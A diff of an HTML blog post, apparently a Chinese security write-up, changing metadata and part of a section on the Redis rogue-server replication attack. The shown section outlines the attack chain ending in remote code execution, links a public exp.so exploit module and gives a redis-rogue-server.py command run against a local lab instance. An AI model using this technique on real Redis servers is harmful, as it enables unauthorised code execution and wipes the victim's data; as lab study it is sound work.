@@ -95,7 +95,7 @@
 <meta property="og:image" content="http://yoursite.com/2020/05/25/redis/7.png">
 <meta property="og:image" content="http://yoursite.com/2020/05/25/redis/8.png">
 <meta property="article:published_time" content="2020-05-25T12:16:05.000Z">
-<meta property="article:modified_time" content="2021-01-07T16:28:15.233Z">
+<meta property="article:modified_time" content="2021-03-12T12:13:34.694Z">
 <meta property="article:author" content="0pa9ue">
 <meta property="article:tag" content="redis">
 <meta name="twitter:card" content="summary">
@@ -440,10 +440,9 @@
 <p>攻击链：受害者设置与攻击者的主从模式 -&gt; 修改备份文件名为exp.so -&gt; 恶意redis与受害者进行握手 —&gt; 恶意redis要求受害者进行一次全量复制 -&gt; 受害者接受exp.so文件（修改了备份文件相关的配置）-&gt; 受害者加载exp.so文件 -&gt; 攻击者rce</p>
 <p><strong>【注意】因为进行的是全量复制，所以说受害者会清空自己redis中所有的数据</strong></p>
 <h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>环境：MAC Redis 5.0.6</p>
-<p>在这里踩了两个坑：</p>
+<p>在这里踩了一个坑：</p>
 <ul>
 <li>如果攻击的redis是mac端，那么就不能直接使用这个<a href="https://github.com/n0b0dyCN/redis-rogue-server/blob/master/exp.so" target="_blank" rel="noopener">exp.so</a>文件，需要在mac下重新make生成一个新的so文件</li>
-<li>remotehost和localhost都要填写同一个网段的内网地址，不然也打不通</li>
 </ul>
 <p>RCE:</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rogue-server.py --rhost=127.0.0.1 --rport=6379 --lhost=127.0.0.1 --lport=6666 --exp=exp_mac.so --verbose</span><br></pre></td></tr></table></figure>
@@ -672,7 +671,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">44.3k</span>
+    <span title="Site words total count">45.5k</span>
   
 </div>
 
